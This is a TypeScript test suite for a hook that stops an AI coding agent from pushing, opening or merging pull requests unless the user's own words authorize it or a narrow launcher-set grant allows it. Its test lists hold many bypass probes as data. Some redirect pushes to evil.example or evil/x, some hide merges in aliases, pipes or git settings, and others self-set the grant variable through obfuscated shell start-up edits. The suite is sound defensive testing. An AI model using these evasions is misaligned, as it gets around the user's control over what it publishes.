import { describe, expect, it } from "bun:test";
import { copyFileSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join, resolve } from "node:path";
import { spawnSync } from "node:child_process";
import { readFileSync } from "node:fs";
import type { Grant } from "../lib/factory-grant";
import { authorized, extractTurn, type FactoryItem, factoryReading, factoryVerdict, gateVerdict, type Git, judge, remoteActions, type RemoteAction, type Turn } from "../lib/remote-git";

const turn = (prompt: string, previousAssistantText = ""): Turn => ({ prompt, previousAssistantText });

describe("remote-git-gate: remoteActions", () => {
  const remote: Array<[string, RemoteAction[]]> = [
    ["git push", ["push"]],
    ["git push origin feat/x", ["push"]],
    ["git -C . push", ["push"]],
    ["git -C ../other push --force-with-lease", ["push-force"]],
    ["git push -f origin main", ["push-force"]],
    ["git push origin +main", ["push-force"]],
    ["git push origin :old-branch", ["push-force"]],
    ["git push --delete origin old", ["push-force"]],
    ["git push -u origin HEAD:refs/heads/x", ["push"]],
    ["git -c core.sshCommand=ssh --no-pager push", ["push"]],
    ["cd sub && git push", ["push"]],
    ["bun test; git push origin main", ["push"]],
    ['bash -c "git push origin main"', ["push"]],
    ["eval 'git push'", ["push"]],
    ['echo "$(git push 2>&1)"', ["push"]],
    ["& git.exe push", ["push"]],
    ["gh pr create --fill", ["pr-create"]],
    ["gh -R MaciWP/poneglyph pr merge 45 --squash", ["pr-merge"]],
    ["git push -u origin b && gh pr create --fill", ["push", "pr-create"]],
    // forms the first detector missed or downgraded.
    [`git commit -m "don't break" && git push origin main && gh pr create --fill --title 'x'`, ["push", "pr-create"]],
    ['git -C "D:/my repo" push', ["push"]],
    ['git "push" origin main', ["push"]],
    ["GIT push origin main", ["push"]],
    ["git -p push origin main", ["push"]],
    ['bash -lc "git push origin main"', ["push"]],
    ["bash <<'EOF'\ngit push origin main\nEOF", ["push"]],
    ['echo "`git push origin main`"', ["push"]],
    ['& "C:/Program Files/Git/cmd/git.exe" push', ["push"]],
    ["\\git push", ["push"]],
    ["git \\\npush origin main", ["push"]],
    ["Invoke-Expression 'git push'", ["push"]],
    ["git subtree push --prefix dist origin gh-pages", ["push"]],
    ['echo "$( (git push) )"', ["push"]],
    ["gh pr new --fill", ["pr-create"]],
    ['git push "--force" origin main', ["push-force"]],
    ['git push origin "+main"', ["push-force"]],
    ["git -c remote.origin.push=+refs/heads/main:refs/heads/main push", ["push-force"]],
    // spec D6: merges the attended gate used to miss now need the user's ask.
    ["gh api -X PUT repos/o/r/pulls/1/merge", ["pr-merge"]],
    ["gh api -XPUT repos/o/r/pulls/1/merge", ["pr-merge"]],
    ["gh api graphql -f query='mutation{mergePullRequest(input:{pullRequestId:1}){clientMutationId}}'", ["pr-merge"]],
    ['M="gh pr merge --squash 1"; $M', ["pr-merge"]],
    ["g\\h pr merge 1", ["pr-merge"]],
    ["gh alias set m 'pr merge'", ["pr-merge"]],
    ["git -c alias.x='!git push -f origin main' x", ["push-force"]],
    ["git config alias.p 'push origin main'", ["push"]],
    ["git rebase -x 'gh pr merge 1' main", ["pr-merge"]],
  ];
  for (const [cmd, actions] of remote) {
    it(`detects: ${cmd.split("\n")[0]}`, () => expect(remoteActions(cmd).sort()).toEqual([...actions].sort()));
  }

  const local = [
    "git status",
    "git checkout -- f",
    "git reset --hard HEAD~1",
    "git commit -m 'push the button'",
    'git commit -m "fix: gate git push and gh pr create"',
    'grep -rn "git push" .claude',
    "cat <<'EOF'\ngit push origin main\nEOF",
    "git commit -m \"$(cat <<'EOF'\nfeat: gate git push\nEOF\n)\"",
    "gh pr view 45",
    "git log --oneline origin/main..HEAD",
    "echo $((1<<2)); git status",
    // spec D6: everyday commands the new reading must leave alone.
    '"$EDITOR" f',
    "$PYTHON x.py",
    'MSG="fix push gate"; git commit -m "$MSG"',
    "export PATH=$PATH:/x",
    "gh api repos/o/r/pulls/1",
    "gh api -X POST repos/o/r/issues/1/comments -f body=merged",
    "git config user.name x",
    "git rebase -i main",
    "git ls-files | xargs git blame",
  ];
  for (const cmd of local) {
    it(`ignores: ${cmd.split("\n")[0]}`, () => expect(remoteActions(cmd)).toEqual([]));
  }

  it("still sees a push after an unclosed shift that looks like a heredoc", () => {
    expect(remoteActions("echo $((1<<x))\ngit push")).toEqual(["push"]);
  });
});

describe("remote-git-gate: authorized", () => {
  // Oriol's own message, verbatim.
  const canonical = "haz commit push abre pr revisalo con asatra /expert-role 6 high y un agente de opus y luego arregla si crees que tioenes razon y merge";
  const yes: Array<[Turn, string]> = [
    [turn("haz push"), "push"],
    [turn("commitea y pushea la rama"), "push"],
    [turn("súbelo a origin"), "push"],
    [turn("sube la rama y abre la PR"), "pr-create"],
    [turn("push it and open a PR"), "pr-create"],
    [turn("mergea la PR"), "pr-merge"],
    [turn("sí", "Los tests pasan. ¿Hago push de la rama?"), "push"],
    [turn("dale", "¿Abro la PR ahora?"), "pr-create"],
    [turn("sí", "Tests en verde. La subo y abro la PR?"), "pr-create"],
    [turn("sí", "Tests en verde. La subo y abro la PR?"), "push"],
    [turn("sí", "Hago push cuando me lo pidas. ¿Hago push de src/utils.ts?"), "push"],
    [turn("sí", "Tests en verde. ¿Sigo?\n\nROBIN: listo; dime «sí» y la subo y abro la PR."), "pr-create"],
    [turn("sí, adelante", "¿Hago push?"), "push"],
    [turn("commit y push"), "push"],
    [turn("haz push --force"), "push-force"],
    [turn("borra la rama remota"), "push-force"],
    [turn(canonical), "push"],
    [turn(canonical), "pr-create"],
    [turn(canonical), "pr-merge"],
    [turn("haz commit push abre pr y merge"), "pr-merge"],
    [turn("No esperes más, haz push"), "push"],
    [turn("sin miedo, haz push"), "push"],
    [turn("crea la PR y mergéala"), "pr-merge"],
    [turn("haz el merge de la PR"), "pr-merge"],
    [turn("merge it"), "pr-merge"],
  ];
  for (const [t, action] of yes) {
    it(`allows ${action} on: ${t.prompt}`, () => expect(authorized(t, action as never)).toBe(true));
  }

  const no: Array<[Turn, string]> = [
    [turn("refactoriza el helper"), "push"],
    [turn("commitea los cambios"), "push"],
    [turn("guarda los cambios y versiona"), "push"],
    [turn("sube el timeout a 30"), "push"],
    // A bare enclitic order names no target: "súbelo a 30" raises a value. Needs "súbelo a origin".
    [turn("súbelo"), "push"],
    [turn("no hagas push todavía"), "push"],
    [turn("commit pero sin push"), "push"],
    [turn("¿por qué me pides permiso para git push?"), "push"],
    [turn("haz push"), "pr-create"],
    [turn("sí", "¿Sigo con los tests?"), "push"],
    // An offer earlier in the message is not the question the "sí" answers.
    [turn("sí", "Hago push cuando me lo pidas. ¿Sigo con el refactor?"), "push"],
    [turn("sí", "Subo la rama cuando quieras. Queda revisar el diff.\n\nROBIN: listo, di sí y sigo."), "push"],
    [turn("ok", "Hecho. No he hecho push."), "push"],
    [turn("vale", "He subido los cambios. ¿Sigo con los tests?"), "push"],
    [turn("arregla el test de git push"), "push"],
    [turn("haz push"), "push-force"],
    [turn(canonical), "push-force"],
    [turn("sí, pero antes revisa el diff completo y los tests de integración y luego ya vemos", "¿Hago push?"), "push"],
    // mentions, refusals and agent prompts.
    [turn("sí, pero no hagas push", "Tests en verde. ¿Hago push?"), "push"],
    [turn("sí", "¿Subo el timeout a 30 segundos?"), "push"],
    [turn("sí", "¿Resuelvo el conflicto de merge en utils.ts?"), "pr-merge"],
    [turn("ok, sin push de momento", "¿Hago push?"), "push"],
    [turn("vale", "¿Pruebo en local sin hacer push?"), "push"],
    [turn("sí", "¿Uso --force-with-lease en el rebase local?"), "push-force"],
    [turn("arregla el push al array en utils.ts"), "push"],
    [turn("Explícame gh pr merge."), "pr-merge"],
    [turn("el push a la cola falla con undefined"), "push"],
    [turn("Revisa el bug. Push notifications no llegan en iOS"), "push"],
    [turn("the push to the queue drops messages, fix it"), "push"],
    [turn("explícame qué hace gh pr create --fill"), "pr-create"],
    [turn('Check false denials in his wording ("haz push", "abre la PR"). Never run a real git push.'), "push"],
  ];
  for (const [t, action] of no) {
    it(`denies ${action} on: ${t.prompt}`, () => expect(authorized(t, action as never)).toBe(false));
  }
});

// The gate's real denials over 14 days of transcripts (2026-09-25 → 10-08), identifiers removed.
// Ten were the user's explicit asks; three were right and must stay denied.
describe("remote-git-gate: real denials replayed", () => {
  const allow: Array<[Turn, string[]]> = [
    [turn("si", 'Los checks están hechos; responde "sí" o "abre la PR" en un mensaje nuevo y la abro con este título.'), ["pr-create", "push"]],
    [turn("Revisa si tienen algún problema y vamos a hacer un commit a main y el push. A priori debería ser seguro."), ["push"]],
    [turn("Por favor. Have un push.", "El commit está en `main` en local; para subirlo, contesta «haz push»."), ["push"]],
    [turn("haz commit, push y merge"), ["push", "pr-merge", "pr-create"]],
    [turn("abre la PR y mérgeala"), ["pr-create", "pr-merge", "push"]],
    [turn("Sí, adelante. Eh, sí hacer pus, abrir la PR y mergearla, por favor.", "Dime «sí, haz push, abre la PR y mergéala» y lo termino."), ["push", "pr-create", "pr-merge"]],
    [turn("adelante hazlo pero antes de mergear quiero que pegues un repaso a los cambios", "Dime «sí, abre la PR» y creo la rama, la subo y abro la PR."), ["push", "pr-create"]],
    [turn("soluciona estos errores y vamos a gacer comnit push merge y git pull de main"), ["push", "pr-merge"]],
    [turn("sigue adelante haz el push y pr"), ["push", "pr-create"]],
    [turn("no pasa nada, haz commit y push"), ["push"]],
  ];
  for (const [t, actions] of allow) {
    for (const action of actions) it(`allows ${action} on: ${t.prompt}`, () => expect(authorized(t, action as never)).toBe(true));
  }

  const deny: Array<[Turn, string]> = [
    [turn("Haz commit push con el texto en ingles breve y claro /natural-writing"), "pr-create"],
    [turn("abre pr", "Falta que me digas «abre la PR y mergea la PR» para abrirla y mergearla."), "pr-merge"],
    [turn("[Request interrupted by user]"), "push"],
    [turn("adelante hazlo pero antes de mergear quiero que pegues un repaso", "Dime «sí, abre la PR y mergéala»."), "pr-merge"],
    // Assent never reaches a force push, even when the previous text quotes one.
    [turn("sí", "Para forzarlo contesta «haz push --force»."), "push-force"],
    [turn("revisa el diff y la PR"), "pr-create"],
    // False allows the 14-day sweep found in a looser draft.
    [turn('<pasted_content id="ab12">\nDo not edit coordination.md. Do not spawn agents, commit, push, change branches.\n</pasted_content id="ab12">\nsigue'), "push"],
    [turn("Report in this terminal only. Do not comment on, approve, or merge the PR, and do not push."), "pr-merge"],
    [turn("Report in this terminal only. Do not edit code, commit, push, approve, merge or write to the tracker."), "push"],
    [turn("ayúdame a escribir el mensaje, voy a mergear la rama del ticket"), "pr-merge"],
    [turn("si está bien la rama y estamos listos para abrir pr o no"), "pr-create"],
    [turn("Candidatos la protección de push, merge creo que debería ser menos dura"), "pr-merge"],
    [turn("Si me refiero a asignar puertos a cada worktree", "Luego hago push de la rama."), "push"],
    [turn("Sí, yo entiendo que esto ha llegado a una PR mergeada, no pasa nada.", "¿Mergeo la PR?"), "pr-merge"],
    [{ ...turn("revisa y dime"), answers: ["PR⇒push; merge⇒PR según replay (Recomendado)"] }, "pr-create"],
    [{ ...turn("revisa y dime"), answers: ["me asigna como revisor en el ticket y en la pr"] }, "pr-create"],
    // A local merge publishes nothing, so it implies no PR and no push.
    [turn("mergea dev en mi rama"), "push"],
    [turn("haz merge de dev en mi rama"), "pr-create"],
  ];
  for (const [t, action] of deny) {
    it(`still denies ${action} on: ${t.prompt}`, () => expect(authorized(t, action as never)).toBe(false));
  }

  it("counts an AskUserQuestion answer from this turn that names the action", () => {
    expect(authorized({ ...turn("revisa y dime"), answers: ["Subir y abrir la PR (Recomendado)"] }, "pr-create")).toBe(true);
    expect(authorized({ ...turn("revisa y dime"), answers: ["Push y PR"] }, "push")).toBe(true);
    expect(authorized({ ...turn("revisa y dime"), answers: ["Dejarlo en local"] }, "push")).toBe(false);
  });
});

// Plan 045 (spec D6): what a command publishes, read for the factory grant's allowlist.
describe("remote-git-gate: factoryReading", () => {
  const push = (refspecs: string[], over: Partial<Extract<FactoryItem, { kind: "push" }>> = {}): FactoryItem => ({ kind: "push", canonical: false, force: false, refspecs, remote: "origin", ...over });
  const pr = (over: Partial<Extract<FactoryItem, { kind: "pr-create" }>> = {}): FactoryItem => ({ kind: "pr-create", canonical: false, draft: false, ...over });
  const rows: Array<[string, FactoryItem[]]> = [
    ["git push -u origin feature/ABC-1", [push(["feature/ABC-1"], { canonical: true })]],
    ["git push --set-upstream origin feature/ABC-1", [push(["feature/ABC-1"], { canonical: true })]],
    ["git push", [{ kind: "push", canonical: false, force: false, refspecs: [] }]],
    ["git push origin HEAD:dev", [push(["HEAD:dev"], { canonical: true })]],
    ["git push origin a b", [push(["a", "b"])]],
    ["git push --all origin", [push(["*"])]],
    ["git push --follow-tags origin feature/ABC-1", [push(["feature/ABC-1", "*"])]],
    ["git push -o ci.skip origin feature/ABC-1", [push(["feature/ABC-1"])]],
    ["git push --repo=o2 feature/ABC-1", [push(["feature/ABC-1"], { remote: "o2" })]],
    ["git -C ../x push origin feature/ABC-1", [push(["feature/ABC-1"])]],
    ["git add . && git push origin feature/ABC-1", [push(["feature/ABC-1"])]],
    ["timeout 60 git push origin feature/ABC-1", [push(["feature/ABC-1"])]],
    ["gh pr create --draft --head feature/ABC-1 -R o/r --title x --body-file b.md", [pr({ canonical: true, draft: true, head: "feature/ABC-1", repo: "o/r" })]],
    ["gh pr create -d -H feature/ABC-1 -R o/r --fill", [pr({ canonical: true, draft: true, head: "feature/ABC-1", repo: "o/r" })]],
    ["gh pr create --head=feature/ABC-1 --repo=x/y", [pr({ canonical: true, head: "feature/ABC-1", repo: "x/y" })]],
    ["gh pr create --draft --web", [pr({ draft: true })]],
    ["gh -R o/r pr create --draft", [pr({ draft: true, repo: "o/r" })]],
    ['gh pr create --draft --body "$(cat b.md)"', [pr({ draft: true })]],
    ["gh pr ready 12", [{ kind: "pr-ready" }]],
    ["gh pr merge --auto --squash", [{ kind: "pr-merge" }]],
    ["gh api -X PUT repos/o/r/pulls/12/merge", [{ kind: "api-write" }]],
    ["gh api -XPUT repos/o/r/pulls/12/merge", [{ kind: "api-write" }]],
    ["gh api -X=PUT repos/o/r/pulls/12/merge", [{ kind: "api-write" }]],
    ["gh api --method=PATCH repos/o/r/pulls/12", [{ kind: "api-write" }]],
    ["gh api repos/o/r/pulls/12 -fstate=closed", [{ kind: "api-write" }]],
    ["gh api graphql -f query='mutation{x}'", [{ kind: "api-write" }]],
    ['bash -c "gh pr merge 1"', [{ kind: "pr-merge" }]],
    ["echo $(gh pr merge 1)", [{ kind: "pr-merge" }]],
    ['M="gh pr merge --squash 1"; $M', [{ kind: "pr-merge" }]],
    ["G=gh; $G pr merge 1", [{ kind: "unknown" }, { kind: "other", what: "gh with no subcommand, which is not a read-only gh command" }]],
    ["g\\h pr merge 1", [{ kind: "pr-merge" }]],
    ['echo "pr merge 1" | xargs gh', [{ kind: "other", what: "gh with no subcommand, which is not a read-only gh command" }]],
    ["gh alias set m 'pr merge'", [{ kind: "other", what: "gh alias set, which is not a read-only gh command" }, { kind: "pr-merge" }]],
    ["gh m 1", [{ kind: "other", what: "gh m 1, which is not a read-only gh command" }]],
    ["git p", [{ kind: "other", what: "git p, which is not a git builtin" }]],
    ["git api repos", [{ kind: "other", what: "git api, which is not a git builtin" }]],
    ["gh api repos/o/r/pulls/12", []],
    ["gh api -X GET repos/o/r/pulls", []],
    ["gh pr view 12", []],
    ["gh pr checks", []],
    ["git commit -m 'push it'", []],
    ["git status && git log --oneline -n 5", []],
    ["git ls-files | xargs git blame", []],
    ['rg "gh pr" .claude', []],
  ];
  for (const [command, items] of rows) it(`reads ${command}`, () => expect(factoryReading(command)).toEqual(items));

  it("reads aliases and the commands git runs for itself", () => {
    const kinds = (c: string) => factoryReading(c).map((i) => (i.kind === "push" ? `push${i.force ? "-force" : ""}` : i.kind));
    expect(kinds("git -c alias.x='!git push -f origin main' x")).toEqual(["other", "push-force"]);
    expect(kinds("git config alias.p 'push origin main'")).toEqual(["push"]);
    expect(kinds("git submodule foreach git push origin main")).toEqual(["push", "push"]);
    expect(kinds("git rebase -x 'gh pr merge 1' main")).toEqual(["pr-merge"]);
  });

  it("marks every force and delete form", () => {
    for (const c of ["git push -f origin feature/ABC-1", "git push --force", "git push --force-with-lease origin x", "git push origin +feature/ABC-1", "git push --delete origin x", "git push origin :x", "git push --mirror origin", "git -c remote.origin.push=+refs/heads/*:refs/heads/* push"]) {
      const [item] = factoryReading(c);
      expect([c, item?.kind === "push" && item.force]).toEqual([c, true]);
    }
  });

  it("reads remote-looking text it cannot parse as unknown", () => {
    expect(factoryReading("bash <<EOF\nset -e; p=push; git $p\nEOF")).toEqual([{ kind: "other", what: "a shell or eval fed on its standard input" }, { kind: "other", what: "git $p, which is not a git builtin" }]);
    expect(factoryReading("git subtree push --prefix x origin y")).toEqual([{ kind: "unknown" }]);
  });
});

const grant: Grant = { ticket: "ABC-1", branch: "feature/ABC-1", repo: "o/r", expires: "2026-10-26T11:00:00Z" };
// A fake repo: each git query answers from the table, anything else fails (null).
const fakeGit = (over: Record<string, string | null> = {}): Git => {
  const table: Record<string, string | null> = {
    "remote get-url --push --all origin": "https://github.com/o/r.git",
    ...over,
  };
  return (_dir, args) => table[args.join(" ")] ?? null;
};
const verdict = (command: string, git = fakeGit()) => factoryVerdict(factoryReading(command), grant, git, "/repo");

describe("remote-git-gate: factoryVerdict", () => {
  it("allows only the two exact shapes", () => {
    for (const c of ["git push -u origin feature/ABC-1", "git push origin feature/ABC-1", "gh pr create --draft --head feature/ABC-1 -R o/r --title x --body-file b.md", "gh pr create -d -H feature/ABC-1 -R O/R --fill"]) expect([c, verdict(c)]).toEqual([c, null]);
    expect(verdict("git push origin feature/ABC-1", fakeGit({ "remote get-url --push --all origin": "https://x-access-token:t@github.com/o/r" }))).toBeNull();
  });

  it("denies every other destination, force, repo, PR kind and api write", () => {
    const denied = [
      "git push origin main",
      "git push origin HEAD:dev",
      "git push origin feature/ABC-1 main",
      "git push --all origin",
      "git push -f origin feature/ABC-1",
      "git push origin +feature/ABC-1",
      "git push --force-with-lease",
      "git push origin :feature/ABC-1",
      "git push https://github.com/o/r feature/ABC-1",
      "git push o2 feature/ABC-1",
      "gh pr create --draft --head feature/OTHER-2 -R o/r",
      "gh pr create --draft --head feature/ABC-1 -R other/x",
      "gh pr ready 12",
      "gh pr merge 12",
      "gh api -X PUT repos/o/r/pulls/12/merge",
      "gh api -XPUT repos/o/r/pulls/12/merge",
      "gh api graphql -f query='mutation{x}'",
      "git push origin feature/ABC-1 && gh pr merge 1",
      "git subtree push --prefix x origin y",
    ];
    for (const c of denied) expect([c, verdict(c)]).toEqual([c, expect.stringMatching(/factory grant for ABC-1/)]);
  });

  // The reviewer's probes (review.md): each one ran under the denylist.
  it("denies the reviewer's bypasses", () => {
    const bypasses = [
      "cd /tmp/other && git push origin feature/ABC-1",
      "git --git-dir=/tmp/other/.git push origin feature/ABC-1",
      "GIT_DIR=/tmp/other/.git git push origin feature/ABC-1",
      "git -c remote.origin.pushurl=https://github.com/evil/x push origin feature/ABC-1",
      "git -C /a -C b push origin feature/ABC-1",
      "gh api -XPUT repos/o/r/pulls/1/merge",
      "gh api -X=PUT repos/o/r/pulls/1/merge",
      'M="gh pr merge --squash 1"; $M',
      'echo "pr merge 1" | xargs gh',
      "gh alias set m 'pr merge'",
      "gh m 1",
      "git -c alias.x='!git push -f origin main' x",
      "echo main | xargs git push origin",
      "GH_REPO=evil/x gh pr create --draft --head feature/ABC-1 -R o/r",
      "gh pr create --draft",
    ];
    for (const c of bypasses) expect([c, verdict(c)]).toEqual([c, expect.stringMatching(/factory grant for ABC-1/)]);
  });

  // The third review (N1): a quoted command handed to a shell, a wrapper or a git setting, and git
  // or gh run by a command the reader does not know.
  it("denies a quoted command that a shell, wrapper or git setting runs", () => {
    const oneLiners = [
      'echo "gh pr merge 1" | sh',
      "printf 'gh pr ready 1' | bash",
      "cat x.sh | timeout 9 bash",
      // round 2: a shell whose command xargs or parallel builds from stdin
      'echo "gh pr merge 1" | xargs -I{} sh -c "{}"',
      'echo "gh pr ready 1" | parallel',
      "'gh pr merge 1' | iex",
      "env -S 'git push origin HEAD:release'",
      "watch 'gh pr merge 1'",
      "find . -maxdepth 0 -exec gh repo delete o/r --yes ';'",
      "stdbuf -o0 gh mm 1",
      "stdbuf git p",
      "Start-Process gh -ArgumentList 'pr','merge','1'",
      "git -c core.pager='gh pr merge 1' log",
      "git config credential.helper '!gh pr merge 1'",
    ];
    for (const c of oneLiners) expect([c, verdict(c)]).toEqual([c, expect.stringMatching(/factory grant for ABC-1/)]);
    const free = ['rg "gh pr" .claude', 'grep -rn "git push" docs', 'git commit -m "document the gh pr create step"', "git log --oneline | grep push", "gh pr checks", "echo gh", "bash scripts/test.sh", 'gh pr create --draft --head feature/ABC-1 -R o/r --title "explain gh pr checks" --body-file b.md'];
    for (const c of free) expect([c, verdict(c)]).toEqual([c, null]);
  });

  // N3: git maps an explicit `<src>` through `remote.origin.push`, and reads `.git/remotes/origin`
  // when the config names no URL.
  it("denies a push that a refspec mapping or a legacy remotes file sends elsewhere", () => {
    expect(verdict("git push -u origin feature/ABC-1", fakeGit({ "config --get-all remote.origin.push": "refs/heads/feature/ABC-1:refs/heads/main" }))).toMatch(/remote\.origin\.push/);
    const legacy = join(mkdtempSync(join(tmpdir(), "legacy-remote-")), "origin");
    writeFileSync(legacy, "URL: https://github.com/o/r.git\nPush: refs/heads/feature/ABC-1:refs/heads/main\n");
    expect(verdict("git push -u origin feature/ABC-1", fakeGit({ "rev-parse --git-path remotes/origin": legacy }))).toMatch(/legacy remotes file/);
    expect(verdict("git push -u origin feature/ABC-1", fakeGit({ "rev-parse --git-path remotes/origin": join(tmpdir(), "no-such-remote-file") }))).toBeNull();
  });

  it("checks every push URL of origin and only trusts https on github.com", () => {
    const urls = (u: string | null) => verdict("git push origin feature/ABC-1", fakeGit({ "remote get-url --push --all origin": u }));
    expect(urls("https://github.com/o/r.git\nhttps://evil.example/x.git")).toMatch(/a push to https:\/\/evil\.example\/x\.git/);
    expect(urls("git@github-personal:o/r.git")).toMatch(/a push to git@github-personal/);
    expect(urls("git@evil.example:o/r.git")).toMatch(/factory grant/);
    expect(urls("https://github.com/o/r-fork.git")).toMatch(/factory grant/);
    expect(urls(null)).toMatch(/URL git cannot read/);
    expect(urls("")).toMatch(/URL git cannot read/);
  });

  it("gives the exact command when an in-scope action comes in another shape", () => {
    for (const c of ["git push", "git add . && git push origin feature/ABC-1", "git push origin HEAD", "timeout 60 git push origin feature/ABC-1"]) {
      expect([c, verdict(c)]).toEqual([c, expect.stringContaining("exactly: git push -u origin feature/ABC-1")]);
    }
    for (const c of ["gh pr create --draft", "gh pr create --head feature/ABC-1 -R o/r", 'gh pr create --draft --head feature/ABC-1 -R o/r --body "$(cat b)"']) {
      expect([c, verdict(c)]).toEqual([c, expect.stringContaining("exactly: gh pr create --draft --head feature/ABC-1 -R o/r")]);
    }
  });

  it("ends the session at the draft PR: a merge or ready is no doubt to note", () => {
    for (const c of ["gh pr merge 12", "gh pr ready 12", "git push origin feature/ABC-1 && gh pr merge 1"]) {
      expect([c, verdict(c)]).toEqual([c, expect.stringMatching(/ends at the draft PR/)]);
      expect([c, verdict(c)]).toEqual([c, expect.not.stringMatching(/dudas\.md/)]);
    }
    expect(verdict("git push --force")).toMatch(/dudas\.md/);
  });

  it("reads git in the payload directory only", () => {
    const dirs: string[] = [];
    factoryVerdict(factoryReading("git push origin feature/ABC-1"), grant, (dir, args) => (dirs.push(dir), fakeGit()(dir, args)), "/repo");
    expect([...new Set(dirs)]).toEqual(["/repo"]);
  });
});

describe("remote-git-gate: gateVerdict under a grant", () => {
  const dir = mkdtempSync(join(tmpdir(), "factory-gate-"));
  const transcript = join(dir, "t.jsonl");
  writeFileSync(transcript, JSON.stringify({ type: "user", promptId: "p1", origin: { kind: "human" }, message: { content: "mergea la PR y haz push --force" } }) + "\n");
  const env = { PONEGLYPH_FACTORY: JSON.stringify(grant) };
  const now = Date.parse("2026-10-26T10:00:00Z");
  const lines: string[] = [];
  const gate = (command: string, extra: Record<string, unknown> = {}, e: Record<string, string | undefined> = env) =>
    gateVerdict(JSON.stringify({ tool_name: "Bash", tool_input: { command }, transcript_path: transcript, prompt_id: "p1", cwd: dir, ...extra }), { env: e, git: fakeGit(), now, log: (_cwd, line) => lines.push(line) });
  const file = (tool_name: string, tool_input: Record<string, unknown>, e: Record<string, string | undefined> = {}) =>
    gateVerdict(JSON.stringify({ tool_name, tool_input }), { env: e, git: fakeGit(), now, log: () => {} });

  it("never lets a chat ask widen the grant", async () => {
    expect(await gate("gh pr merge 1")).toMatch(/factory grant for ABC-1/);
    expect(await gate("git push --force")).toMatch(/factory grant for ABC-1/);
    expect(await gate("git push -u origin feature/ABC-1")).toBeNull();
    expect(await gate("git status")).toBeNull();
  });

  it("reads PowerShell's escape character", async () => {
    expect(await gate("g`h pr m`erge 1", { tool_name: "PowerShell" })).toMatch(/ends at the draft PR/);
  });

  it("keeps a subagent out even with a grant", async () => {
    expect(await gate("git push -u origin feature/ABC-1", { agent_id: "a1" })).toMatch(/never runs inside a subagent/);
    expect(await gate("gh pr ready 1", { agent_id: "a1" })).toMatch(/never runs inside a subagent/);
  });

  it("falls back to the attended rules without a valid grant", async () => {
    expect(await gate("gh pr merge 1", {}, {})).toBeNull();
    expect(await gate("git push -u origin feature/ABC-1", {}, { PONEGLYPH_FACTORY: "{" })).toBeNull();
  });

  it("denies any command that sets the grant, in every session (D5, best-effort)", async () => {
    const minted = [
      "PONEGLYPH_FACTORY='{}' claude -p x",
      "export PONEGLYPH_FACTORY=x",
      "env PONEGLYPH_FACTORY=x claude",
      "declare -x PONEGLYPH_FACTORY=x",
      "unset PONEGLYPH_FACTORY",
      'bash -c "export PONEGLYPH_FACTORY=x"',
      "Set-Item env:PONEGLYPH_FACTORY x",
      // the reviewer's forms
      `env PONEGLYPH_"FACTORY"='{}' claude`,
      "export PONEGLYPH_FACT\\ORY=x",
      'V=FACTORY; eval "export PONEGLYPH_$V=x"; claude',
      "printf 'export PONEGLYPH_FACTORY=x' >> ~/.zshenv",
      `echo '{"env":{"PONEGLYPH_FACTORY":"x"}}' > .claude/settings.local.json`,
      "echo PONEGLYPH_FACTORY=x | tee -a ~/.bashrc",
      // names the shell completes at run time, and Windows' case-blind env
      "export PONEGLYPH_FACTOR{Y,}=x",
      "export PONEGLYPH_FACT'ORY'=x",
      "export poneglyph_factory=x",
      "sed -i '' '$a export PONEGLYPH_FACTORY=x' ~/.zshrc",
      "echo PONEGLYPH_FACTORY=x &>> ~/.zshenv",
      // the second review's M1: a heredoc written into a start-up file
      "cat > ~/.zshenv <<'EOF'\nexport PONEGLYPH_FACTORY=x\nEOF",
      "tee -a ~/.bashrc <<EOF\nexport PONEGLYPH_FACTORY=x\nEOF",
      // the third review's N2: escapes the shell or printf decode, and a splice where the `_` goes
      `export "$(printf 'PONEGLYPH\\x5fFACTORY')"='{}' && claude -p --model haiku x`,
      "export PONEGLYPH$'\\x5f'FACTORY=x",
      `export "$(printf 'PONEGLYPH\\137FACTORY')"=x`,
      "U=_; export PONEGLYPH${U}FACTORY=x",
      "launchctl setenv PONEGLYPH_FACTORY x",
      "setx PONEGLYPH_FACTORY x",
      "echo 'export PONEGLYPH_FACTORY=x' >> .envrc",
      "echo 'export PONEGLYPH_FACTORY=x' >> ~/.bash_aliases",
    ];
    for (const c of minted) {
      expect([c, await gate(c)]).toEqual([c, expect.stringMatching(/only the launcher sets it/)]);
      expect([c, await gate(c, {}, {})]).toEqual([c, expect.stringMatching(/only the launcher sets it/)]);
    }
    expect(await gate("$env:PONEGLYPH_FACTORY='x'", { tool_name: "PowerShell" })).toMatch(/only the launcher/);
    for (const c of ["bash <<EOF\nexport PONEGLYPH_FACTORY=x\nEOF", "echo $(export PONEGLYPH_FACTORY=x)", "[Environment]::SetEnvironmentVariable('PONEGLYPH_FACTORY', 'x')", "$env:PONEGLYPH_FACTORY = 'x'"]) {
      expect([c, await gate(c)]).toEqual([c, expect.stringMatching(/only the launcher/)]);
    }
    // Data, not commands: what the shell would never run as an assignment.
    for (const c of ["echo $PONEGLYPH_FACTORY", 'git commit -m "PONEGLYPH_FACTORY docs"', 'git commit -m "export PONEGLYPH_FACTORY=x"', "cat > v.json <<'EOF'\n{\"evidence\": \"export PONEGLYPH_FACTORY exits 2\"}\nEOF", "python3 - <<'EOF'\np = 'settings.local.json'; v = 'PONEGLYPH_FACTORY'\nEOF", "grep -n 'PONEGLYPH_FACTORY=' f", "rg PONEGLYPH_FACTORY= .claude", "git rm docs/PONEGLYPH_FACTORY.md", "echo $env:PONEGLYPH_FACTORY"]) {
      expect([c, await gate(c)]).toEqual([c, null]);
    }
    // Reads of the files the grant must stay out of, and the other PONEGLYPH_ variables.
    const free = [
      "rg -n PONEGLYPH_ .claude/settings.global.json",
      "jq '.env.PONEGLYPH_ROUTER' ~/.claude/settings.json",
      "grep PONEGLYPH_FACTORY ~/.zshrc > hits.txt",
      "export PONEGLYPH_DISABLE_TEAM_MODE=1",
      "env PONEGLYPH_ROUTER=0 claude -p x",
      "PONEGLYPH_CLAUDE_BIN=/x/claude bun run evals",
      "unset PONEGLYPH_ROUTER_MEMORY",
      "echo 'export PONEGLYPH_CORE=1' >> ~/.zshrc",
      // the second review's M2: printing is not exporting
      "echo export PONEGLYPH_FACTORY=x",
      // the repo's own name in a path
      "export REPO=/Users/x/poneglyph",
      "cd ~/poneglyph && git status",
    ];
    for (const c of free) expect([c, await gate(c)]).toEqual([c, null]);
    expect(await gate("$env:PONEGLYPH_ROUTER='0'", { tool_name: "PowerShell" })).toBeNull();
  });

  it("denies writing the grant into a settings or start-up file with the file tools", async () => {
